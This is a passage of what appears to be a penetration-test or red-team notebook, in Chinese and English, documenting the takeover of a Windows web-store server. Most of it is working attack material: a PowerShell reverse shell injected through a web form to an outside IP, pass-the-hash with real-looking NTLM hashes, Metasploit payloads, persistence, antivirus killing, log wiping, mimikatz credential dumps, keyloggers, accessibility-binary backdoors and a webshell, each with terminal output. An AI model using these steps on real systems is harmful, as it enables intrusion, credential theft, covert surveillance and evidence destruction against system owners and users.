test && net user && echo "-" && whoami
```
```cmd!
Finished!
User accounts for \\DIGISERVER2
-------------------------------------------------------------------------------
digiserver2 Guest
user1 user2 user3
The command completed successfully.
"-"
digiserver2\digiserver2
```

### XSS: Reflected
http://digiserver2.eastus.cloudapp.azure.com/store/Product/Detail?ProductID=1&url=https://pastebin.com/raw/spyupYdc

## A05:2021 – 安全設定缺陷
### File Download
* Can download file from any place
http://digiserver2.eastus.cloudapp.azure.com/store/FileDownload/Download?filePath=~/App_Data/backup.bat

### File Upload
* Can upload any type of file
http://digiserver2.eastus.cloudapp.azure.com/store/Admin/Create

## Reverse Shell
### WebApp Command Injection
https://www.revshells.com/
Windows平台上，可利用PowerShell

RCE:
```cmd!
test && powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('159.89.115.68',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
Attacker:
```bash!
┌──(root💀kali)-[~]
└─# rlwrap -cAr nc -lvnp 1337                                                 
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 40.76.51.149.
Ncat: Connection from 40.76.51.149:53793.
whoami
digiserver2\digiserver2
PS C:\WebApp\MyStore.WebUI\App_Data>
```

### PSEXEC
Use [IMPACKET](https://github.com/SecureAuthCorp/impacket) - PTH Attack
```bash!
┌──(root㉿kali)-[~]
└─# cd /usr/share/doc/python3-impacket/examples/

┌──(root㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─# ls
Get-GPPPassword.py  findDelegation.py  machine_role.py       ping6.py          samrdump.py     split.py
GetADUsers.py       getArch.py         mimikatz.py           psexec.py         secretsdump.py  ticketConverter.py
GetNPUsers.py       getPac.py          mqtt_check.py         raiseChild.py     services.py     ticketer.py
GetUserSPNs.py      getST.py           mssqlclient.py        rbcd.py           smbclient.py    wmiexec.py
addcomputer.py      getTGT.py          mssqlinstance.py      rdp_check.py      smbexec.py      wmipersist.py
atexec.py           goldenPac.py       netview.py            reg.py            smbpasswd.py    wmiquery.py
dcomexec.py         karmaSMB.py        nmapAnswerMachine.py  registry-read.py  smbrelayx.py
dpapi.py            keylistattack.py   ntfs-read.py          rpcdump.py        smbserver.py
esentutl.py         kintercept.py      ntlmrelayx.py         rpcmap.py         sniff.py
exchanger.py        lookupsid.py       ping.py               sambaPipe.py      sniffer.py
```

```bash!
┌──(root㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─# python3 psexec.py digiserver22@52.255.150.97 -hashes aad3b435b51404eeaad3b435b51404ee:fbc954d40e1dc675cbbd3510b18e1972
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 52.255.150.97.....
[*] Found writable share ADMIN$
[*] Uploading file VRNuMamc.exe
[*] Opening SVCManager on 52.255.150.97.....
[*] Creating service AbRv on 52.255.150.97.....
[*] Starting service AbRv.....
[!] Press help for extra shell commands                                                                                      Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\windows\system32> whoami                                                                                                  nt authority\system

```
### SMBExec
SMBExec在目標系統不會生成檔案，較不明顯
```
smbexec.py
```

## Metasploit
### Get Meterpreter
Windows平台可用[PowerShell](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)下載檔案，
也可用[Csutil、bitsadmin、Certutil.exe](https://book.hacktricks.xyz/windows-hardening/basic-cmd-for-pentesters#download)等內建程式

#### Method 1
利用RCE : `http://digiserver2.eastus.cloudapp.azure.com/store/Admin/Backup`

利用windows的`Rundll32.exe`載後門
```powershell!
$ use exploit/windows/smb/smb_delivery
$ set srvhost 159.89.115.68
$ exploit
```
Command Injection:
`test && rundll32.exe \\159.89.115.68\aMHR\test.dll,0`

![](https://i.imgur.com/hzMMJq7.png)

#### Method 2
利用PSEXEC，[Pass The Hash Attack](https://book.hacktricks.xyz/windows-hardening/ntlm)
```powershell
msf6 exploit(windows/smb/psexec) > use exploit/windows/smb/psexec
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set RHOSTS 40.76.51.149
RHOSTS => 40.76.51.149
msf6 exploit(windows/smb/psexec) > set SMBuser digiserver2
SMBuser => digiserver2
msf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:fbc954d40e1dc675cbbd3510b18e1972
SMBPass => aad3b435b51404eeaad3b435b51404ee:fbc954d40e1dc675cbbd3510b18e1972
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 159.89.115.68:4444
[*] 40.76.51.149:445 - Connecting to the server...
[*] 40.76.51.149:445 - Authenticating to 40.76.51.149:445 as user 'digiserver2'...
[*] 40.76.51.149:445 - Selecting PowerShell target
[*] 40.76.51.149:445 - Executing the payload...
[+] 40.76.51.149:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175686 bytes) to 40.76.51.149
[*] Meterpreter session 3 opened (159.89.115.68:4444 -> 40.76.51.149:53013) at 2022-08-20 01:32:00 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : DIGISERVER2
OS              : Windows 2008 R2 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x86/windows
meterpreter >
```

### Listener
```powershell!
$ msf exploit(handler) > use exploit/multi/handler
$ msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
$ msf exploit(handler) > set LHOST 159.89.115.68
LHOST => 159.89.115.68
$ msf exploit(handler) > set LPORT 443
LPORT => 443
$ msf exploit(handler) > exploit -j
```

### Privilege Escalation
```cmd!
$ getsystem
```
![](https://i.imgur.com/EERYpxC.png)

![](https://i.imgur.com/BgUUss3.png)


### Persistence
Refer - https://www.hackingarticles.in/multiple-ways-to-persistence-on-windows-10-with-metasploit/

#### Method 1
Add to service, start on boot(Best Method)
```powershell!
$ use exploit/windows/local/persistence_service
$ set session 3
$ set lport 443
$ exploit -j
```

#### Method 2
Add To Startup
```powershell!
$ run persistence -U -i 5 -p 443 -r 159.89.115.68
```
![](https://i.imgur.com/zGf5jM9.png)
![](https://i.imgur.com/56matIm.png)

#### RDP
```powershell
meterpreter > run getgui -e -u admin -p GSS%azure$

[!] Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.
[!] Example: run post/windows/manage/enable_rdp OPTION=value [...]
[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
[*] Carlos Perez carlos_perez@darkoperator.com
[*] Enabling Remote Desktop
[*]     RDP is already enabled
[*] Setting Terminal Services service startup mode
[*]     Terminal Services service is already set to auto
[*]     Opening port in local firewall if necessary
[*] Setting user account for logon
[*]     Adding User: jim with Password: Metasploit$1
[*]     Hiding user from Windows Login screen
[*]     Adding User: jim to local group 'Remote Desktop Users'
[*]     Adding User: jim to local group 'Administrators'
[*] You can now login with the created user
[*] For cleanup use command: run multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up__20220819.0021.rc
```

#### System Level CMD
```cmd!
meterpreter > run post/windows/manage/sticky_keys

[+] Session has administrative rights, proceeding.
[+] 'Sticky keys' successfully added. Launch the exploit at an RDP or UAC prompt by pressing SHIFT 5 times.
```

#### SSH
安裝SSH，防毒會認為是合法程序，之後可利用ssh連入
```bash!
meterpreter > run post/windows/manage/install_ssh

[*] Installing OpenSSH.Server
[+] Compressed size: 1336
[*] Installing OpenSSH.Client
[+] Compressed size: 1152
```

#### Kill AV
發現目標在用防毒掃描，用KillAV
```bash!
meterpreter > run killav

[!] Meterpreter scripts are deprecated. Try post/windows/manage/killav.
[!] Example: run post/windows/manage/killav OPTION=value [...]
[*] Killing Antivirus services on the target...
[*] Killing off cmd.exe...
[*] Killing off cmd.exe...
```

#### Duplicate
為避免session壞掉，多開幾個session
```cmd!
meterpreter > run post/windows/manage/multi_meterpreter_inject

[*] Running module against DIGISERVER2
[*] Creating a reverse meterpreter stager: LHOST=159.89.115.68 LPORT=4444
[+] Starting Notepad.exe to house Meterpreter Session.
[+] Process created with pid 16972
[*] Injecting meterpreter into process ID 16972
[*] Allocated memory at address 0x01eb0000, for 296 byte stager
[*] Writing the stager into memory...
[+] Successfully injected Meterpreter in to process: 16972
```

#### Proccess Migrate
注入到其他程序，能夠一定程度規避掃毒軟體
也能以程序使用者的身分進行動作
Migrate後才能用`run post/windows/gather/dumplinks` ...etc

```cmd!
meterpreter > run post/windows/manage/migrate

[*] Running module against DIGISERVER2
[*] Current server process: rundll32.exe (776)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 1668
[+] Successfully migrated into process 1668
```

#### Remove Traces
##### 清理系統事件
```cmd!
meterpreter > clearev
[*] Wiping 97 records from Application...
[*] Wiping 415 records from System...
[*] Wiping 111 records from Security...
```

##### 清理IIS記錄檔
```cmd!
rmdir /q /s C:\inetpub\logs\
```

##### 清理Elmah Error記錄檔
```CMD!
rmdir /q /s C:\WebApp\MyStore.WebUI\App_Data\Elmah.Errors
```


### HashDump
用於Pass The Hash Attack

* Method 1
```powershell!
$ load kiwi
$ creds_all
$ kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"
```

```cmd!
mimikatz(powershell) # lsadump::sam
Domain : DIGISERVER2
SysKey : b313dde382f6d2ac0aa856ca66f481ba
Local SID : S-1-5-21-569414602-2136848009-1330675085

SAMKey : fe296fa156f5e654e8af3227fd409796

RID  : 000001f4 (500)
User : digiserver2
  Hash NTLM: fbc954d40e1dc675cbbd3510b18e1972

RID  : 000001f5 (501)
User : Guest

RID  : 000003f1 (1009)
User : user1
  Hash NTLM: de26cce0356891a4a020e7c4957afc72

RID  : 000003f2 (1010)
User : user2
  Hash NTLM: 0229a7a4cd52062d9480fb4dbe41d41a

RID  : 000003f3 (1011)
User : user3
  Hash NTLM: 161cff084477fe596a5db81874498a24

```

* Method 2
```css!
meterpreter > run post/windows/gather/hashdump

[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY b313dde382f6d2ac0aa856ca66f481ba...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...

No users with password hints on this system

[*] Dumping password hashes...


digiserver2:500:aad3b435b51404eeaad3b435b51404ee:fbc954d40e1dc675cbbd3510b18e1972:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user1:1009:aad3b435b51404eeaad3b435b51404ee:de26cce0356891a4a020e7c4957afc72:::
user2:1010:aad3b435b51404eeaad3b435b51404ee:0229a7a4cd52062d9480fb4dbe41d41a:::
user3:1011:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
admin:1014:aad3b435b51404eeaad3b435b51404ee:c0ba583087359901a3aaebf46fd7078f:::
```

目標防守後Hash值
```p
meterpreter > hashdump
digiserver2:500:aad3b435b51404eeaad3b435b51404ee:fbc954d40e1dc675cbbd3510b18e1972:::
digiserver22:1016:aad3b435b51404eeaad3b435b51404ee:fbc954d40e1dc675cbbd3510b18e1972:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### Keylogger
#### 在系統登入頁面層級(migrate到`winlogon.exe`)開始鍵盤側錄
```bash=
meterpreter > ps | winlogon
Filtering on 'winlogon'

Process List
============

 PID    PPID   Name          Arch  Session  User                 Path
 ---    ----   ----          ----  -------  ----                 ----
 508    468    winlogon.exe  x64   1        NT AUTHORITY\SYSTEM  C:\Windows\System32\winlogon.exe
 15896  16220  winlogon.exe  x64   2        NT AUTHORITY\SYSTEM  C:\Windows\System32\winlogon.exe
 21468  21436  winlogon.exe  x64   3        NT AUTHORITY\SYSTEM  C:\Windows\System32\winlogon.exe

meterpreter > migrate 508
[*] Migrating from 36388 to 508...
[*] Migration completed successfully.
meterpreter > keyscan_start
Starting the keystroke sniffer ...
meterpreter >
```
#### 在digiserver2使用者層級鍵盤側錄
```bash=
meterpreter > ps

Process List
============

 PID    PPID   Name                  Arch  Session  User                              Path
 ---    ----   ----                  ----  -------  ----                              ----
 0      0      [System Process]
 4      0      System                x64   0
 ...
 C:\Windows\System32\msdtc.exe
 5256   1044   w3wp.exe              x64   0        DIGISERVER2\digiserver2           C:\Windows\System32\inetsrv\w3wp.exe

meterpreter > migrate 5256
[*] Migrating from 35904 to 5256...
[*] Migration completed successfully.
meterpreter > keyscan_start
Starting the keystroke sniffer ...
```

##### Alternative
```bash
meterpreter > run keylogrecorder

[!] Meterpreter scripts are deprecated. Try post/windows/capture/keylog_recorder.
[!] Example: run post/windows/capture/keylog_recorder OPTION=value [...]
[*] Starting the keystroke sniffer...
[*] Keystrokes being saved in to /root/.msf4/logs/scripts/keylogrecorder/52.255.150.97_20220824.1144.txt
[*] Recording

^C[*] Saving last few keystrokes

[*] Interrupt
[*] Stopping keystroke sniffer...
```


### Interactive Shell
```cmd!
execute -f cmd.exe -i -H
```
```cmd!
shell
```


### Check VM
```cmd!
meterpreter > run post/windows/gather/checkvm

[*] Checking if the target is a Virtual Machine ...
[+] This is a Hyper-V Virtual Machine
```

### Sysinfo
```cmd!
meterpreter > sysinfo
Computer        : DIGISERVER2
OS              : Windows 2008 R2 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

### Get Installed Apps
```cmd
meterpreter > run post/windows/gather/enum_applications

[*] Enumerating applications installed on DIGISERVER2

Installed Applications
======================

 Name                                                                                      Version
 ----                                                                                      -------
 Druva inSync 6.5.2                                                                        6.5.2.0
 Druva inSync 6.5.2                                                                        6.5.2.0
 Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB946040)           1
 Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB946040)           1
 Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB946308)           1
 Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB946308)           1
 Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB946344)           1
 Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB946344)           1
 Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB947540)           1
 Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB947540)           1
 Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB947789)           1
 Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB947789)           1
 Microsoft .NET Framework 4 Multi-Targeting Pack                                           4.0.30319
...
```

### Get User Login Info
```cmd
meterpreter > run post/windows/gather/enum_logged_on_users

[*] Running against session 1

Current Logged Users
====================

 SID                                            User
 ---                                            ----
 S-1-5-21-569414602-2136848009-1330675085-1014  DIGISERVER2\admin
 S-1-5-21-569414602-2136848009-1330675085-500   DIGISERVER2\digiserver2


[+] Results saved in: /root/.msf4/loot/20220819012503_default_10.5.0.6_host.users.activ_801038.txt

Recently Logged Users
=====================

 SID                                                              Profile Path
 ---                                                              ------------
 S-1-5-18                                                         %systemroot%\system32\config\systemprofile
 S-1-5-19                                                         C:\Windows\ServiceProfiles\LocalService
 S-1-5-20                                                         C:\Windows\ServiceProfiles\NetworkService
 S-1-5-21-569414602-2136848009-1330675085-1011                    C:\Users\user3
 S-1-5-21-569414602-2136848009-1330675085-1014                    C:\Users\admin
 S-1-5-21-569414602-2136848009-1330675085-500                     C:\Users\digiserver2
 S-1-5-80-4236765743-3808192740-2613062417-2221589958-392330778   C:\Users\SqlIaaSExtensionQuery
 S-1-5-82-1036420768-1044797643-1061213386-2937092688-4282445334  C:\Users\Classic .NET AppPool

```

### Use Post Modules
```cmd
msf6 exploit(multi/handler) > search post/windows

Matching Modules
================

   #    Name                                                       Disclosure Date  Rank       Check  Description
   -    ----                                                       ---------------  ----       -----  -----------
   0    post/windows/gather/ad_to_sqlite                                            normal     No     AD Computer, Group and Recursive User Membership to Local SQLite DB
   1    post/windows/gather/credentials/aim                                         normal     No     Aim credential gatherer
   2    post/windows/manage/archmigrate                                             normal     No     Architecture Migrate
   3    auxiliary/parser/unattend                                                   normal     No     Auxilliary Parser Windows Unattend Passwords
   4    post/windows/gather/avast_memory_dump                                       normal     No     Avast AV Memory Dumping Utility
   5    post/windows/gather/bitlocker_fvek                                          normal     No     Bitlocker Master Key (FVEK) Extraction
   6    post/windows/gather/bloodhound                                              normal     No     BloodHound Ingestor
   7    post/windows/gather/get_bookmarks                                           normal     No     Bookmarked Sites Retriever
   8    post/windows/gather/credentials/chrome                                      normal     No     Chrome credential gatherer
   9    post/windows/gather/credentials/comodo                                      normal     No     Comodo credential gatherer
   10   post/windows/gather/credentials/coolnovo                                    normal     No     Coolnovo credential gatherer
...
```


## Window CMDs

Enable user to connect RDP via adding to RDP group
```
net localgroup
net localgroup "Remote Desktop Users"
net localgroup "Remote Desktop Users" /ADD admin
```

Add User To Admins group
```
net user Admin Metasploit$1 /add
net localgroup Administrators
net localgroup Administrators /add admin
```


## Exploits
漏洞搜尋

### Shodan
https://exploits.shodan.io/

### SearchSploit
```cmd
┌──(root💀kali)-[~]
└─# searchsploit Windows 2008 R2
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64) - Local Privilege Escalation (MS16-032) (PowerShell)                                                                    | windows/local/39719.ps1
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                                                                            | windows/remote/42031.py
Microsoft Windows 7/2008 R2 - Remote Kernel Crash                                                                                                                           | windows/dos/10005.py
Microsoft Windows 7/2008 R2 - SMB Client Trans2 Stack Overflow (MS10-020) (PoC)                                                                                             | windows/dos/12273.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                                                        | windows/remote/42315.py
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution (MS17-010)                                                                               | windows_x86-64/remote/41987.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

從nmap xml掃描結果搜尋
```cmd
┌──(root💀kali)-[~]
└─# searchsploit --nmap gss-webapp-win.xml
```

### Metasploit Exploit Suggester
```powershell
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.5.0.4 - Collecting local exploits for x86/windows...
[*] 10.5.0.4 - 167 exploit checks are being tried...
[+] 10.5.0.4 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 10.5.0.4 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.5.0.4 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.5.0.4 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.5.0.4 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.5.0.4 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.5.0.4 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41
[*] 10.5.0.4 - Valid modules for session 2:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/ikeext_service                           Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/ms10_092_schelevator                     Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
 9   exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
 10  exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
...
```

### 用 `ms10_092_schelevator`
```cmd
msf6 exploit(windows/local/ikeext_service) > use exploit/windows/local/ms10_092_schelevator
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/local/ms10_092_schelevator) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/ms10_092_schelevator) > exploit

[-] Handler failed to bind to 159.89.115.68:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[-] Exploit aborted due to failure: no-target: Running against via WOW64 is not supported, try using an x64 meterpreter...
[*] Exploit completed, but no session was created.
```

**錯誤:** 會出現`Running against via WOW64 is not supported`
**解決:** 把session 1 migrate到x64的proccess中
```cmd
meterpreter > ps

Process List
============

 PID   PPID  Name                               Arch  Session  User                              Path
 ---   ----  ----                               ----  -------  ----                              ----
 0     0     [System Process]
 4     0     System                             x64   0
...
 5428  424   conhost.exe                        x64   0        NT AUTHORITY\SYSTEM               C:\Windows\System32\conhost.exe
 5516  424   conhost.exe                        x64   0        NT AUTHORITY\SYSTEM               C:\Windows\System32\conhost.exe
 5628  5896  cmd.exe                            x86   0        NT AUTHORITY\SYSTEM               C:\windows\SysWOW64\cmd.exe
 5668  4248  notepad++.exe                      x64   2        DIGISERVER1\jim                   C:\Program Files\Notepad++\notepad++.exe
 5876  3860  WindowsUpdate.exe                  x86   0        DIGISERVER1\digiserver1           C:\Users\digiserver1\AppData\Local\Temp\WindowsUpdate.exe
 5896  4720  WindowsUpdate.exe                  x86   0        NT AUTHORITY\SYSTEM               C:\Users\digiserver1\AppData\Local\Temp\WindowsUpdate.exe

meterpreter > migrate 5668
[*] Migrating from 792 to 5668...
[*] Migration completed successfully.
meterpreter > bg
[*] Backgrounding session 1...
```
**結果:** 
```cmd!
msf6 exploit(windows/local/ms10_092_schelevator) > exploit

[-] Handler failed to bind to 159.89.115.68:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[*] Preparing payload at C:\Users\jim\AppData\Local\Temp\yrHLvtUAGMgBT.exe
[*] Creating task: HM51a01gtoTLS
[*] SUCCESS: The scheduled task "HM51a01gtoTLS" has successfully been created.
[*] SCHELEVATOR
[*] Reading the task file contents from C:\windows\system32\tasks\HM51a01gtoTLS...
[*] Original CRC32: 0xe8db95b3
[*] Final CRC32: 0xe8db95b3
[*] Writing our modified content back...
[*] Validating task: HM51a01gtoTLS
[*] ERROR: The task image is corrupt or has been tampered with.
[*] Disabling the task...
[*] ERROR: The specified task name "HM51a01gtoTLS" does not exist in the system.
[*] Enabling the task...
[*] ERROR: The specified task name "HM51a01gtoTLS" does not exist in the system.
[*] Executing the task...
[*] ERROR: The task image is corrupt or has been tampered with.
[*] Deleting the task...
[*] SUCCESS: The scheduled task "HM51a01gtoTLS" was successfully deleted.
[*] SCHELEVATOR
[*] Exploit completed, but no session was created.

```


## BackDoors
### RDP - Windows登入頁面後門
```cmd
takeown /f "C:\Windows\System32\Magnify.exe"
icacls "C:\Windows\System32\Magnify.exe" /grant administrators:F
ren "C:\Windows\System32\Magnify.exe" "Magnify_back.exe"
copy "C:\Windows\System32\cmd.exe" "C:\Windows\System32\Magnify.exe"
``` 
or
```cmd!
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
```

### WebShell
http://digiserver2.eastus.cloudapp.azure.com/store/Uploads/about.asp?cmd=whoami

Refer - https://github.com/tennc/webshell/blob/master/asp/webshell.asp